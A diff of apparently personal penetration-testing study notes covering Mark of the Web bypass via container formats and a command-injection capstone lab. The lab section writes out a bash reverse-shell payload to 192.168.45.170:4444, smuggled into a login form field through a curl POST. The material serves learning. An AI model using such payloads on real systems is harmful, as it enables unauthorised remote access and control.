@@ -395,7 +395,7 @@
 - MOTW (Mark of the Web) is not added to files on FAT32-formatted devices because FAT32 does not support NTFS Alternate Data Streams (ADS), which is where MOTW is stored.
 - macros in files downloaded from the internet (with MOTW) are blocked by default, and users can no longer enable them with a single click (like the old “Enable Content” button). Instead, they must explicitly unblock the file via the file properties or follow other administrative steps.
 - possible to avoid getting a file flagged with Mark of the Web (MOTW) by embedding it within container formats such as .7z, .iso, or .img
-- 
+  
 ### 13. Locating public exploits
 ### 14. Fixing exploits
 ### 15. Antivirus evasion
@@ -705,7 +705,7 @@
     whoami  
     sudo su  
     cat /opt/config.txt  
-  - identify os command vulnerabilities + bash shell reverse shell
+  - **Capstone lab**: identify os command vulnerabilities + bash shell reverse shell
     Test each input field one at a time (Burp intruter)
     ```
     ; id
@@ -715,7 +715,8 @@
     ```
     Before encode: "&&bash -c 'bash -i >& /dev/tcp/192.168.45.170/4444 0>&1'"  
     Note: closes a previous string with ", then uses && to run a bash reverse shell connecting back to 192.168.45.170 on port 4444  
-    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.170/4444+0>%261'%22"`
+    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.170/4444+0>%261'%22"`  
+- **Capstone lab**:
 
 ### SQL injection attacks
 
